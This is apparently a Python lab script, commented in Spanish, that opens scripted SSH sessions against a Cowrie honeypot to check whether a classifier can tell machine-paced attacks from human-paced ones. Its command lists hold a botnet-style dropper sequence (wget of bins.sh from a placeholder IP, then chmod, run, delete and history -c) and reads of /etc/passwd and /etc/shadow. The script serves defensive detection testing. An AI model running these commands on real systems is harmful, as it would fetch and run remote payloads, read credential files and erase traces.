#!/usr/bin/env python3
"""
Atacante de demostración contra el honeypot Cowrie. Genera dos sesiones SSH con
timing realista para validar el clasificador en vivo:

  - 'auto'   : comandos en ráfaga (ritmo de máquina)        -> debe dar AUTOMATED
  - 'manual' : comandos con pausas humanas (3-7 s)           -> debe dar MANUAL

Uso:
  python3 attack_paramiko.py <IP_VICTIMA> [auto|manual|both]

Requiere: paramiko  (pip install paramiko). Credencial del lab: root / lab123
"""
import sys
import time
import random

import paramiko

PORT = 2222
USER = "root"
PASS = "lab123"

AUTO_CMDS = [
    "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /",
    "wget http://203.0.113.10/bins.sh",
    "chmod 777 bins.sh",
    "sh bins.sh",
    "rm -rf bins.sh",
    "history -c",
]

MANUAL_CMDS = [
    "whoami", "id", "uname -a", "ls -la /root", "cat /etc/passwd",
    "ps aux | grep ssh", "netstat -tulpn", "cat /etc/shadow",
]


def run_session(host, cmds, human=False, label=""):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    cli.connect(host, port=PORT, username=USER, password=PASS,
                look_for_keys=False, allow_agent=False, timeout=15)
    chan = cli.invoke_shell()
    time.sleep(1.0)
    chan.recv(4096)
    print(f"[{label}] sesión iniciada ({'manual' if human else 'automatizado'})")
    for c in cmds:
        chan.send(c + "\n")
        print(f"   $ {c}")
        if human:
            time.sleep(random.uniform(3.0, 7.0))   # pausa humana
        else:
            time.sleep(0.05)                        # ráfaga de máquina
        if chan.recv_ready():
            chan.recv(8192)
    chan.send("exit\n")
    time.sleep(1.0)
    cli.close()
    print(f"[{label}] sesión cerrada\n")


def main():
    if len(sys.argv) < 2:
        sys.exit("Uso: attack_paramiko.py <IP_VICTIMA> [auto|manual|both]")
    host = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else "both"

    if mode in ("auto", "both"):
        run_session(host, AUTO_CMDS, human=False, label="AUTO")
    if mode in ("manual", "both"):
        run_session(host, MANUAL_CMDS, human=True, label="MANUAL")
    print("Listo. Revisa los veredictos en la víctima y las alertas en Wazuh.")


if __name__ == "__main__":
    main()
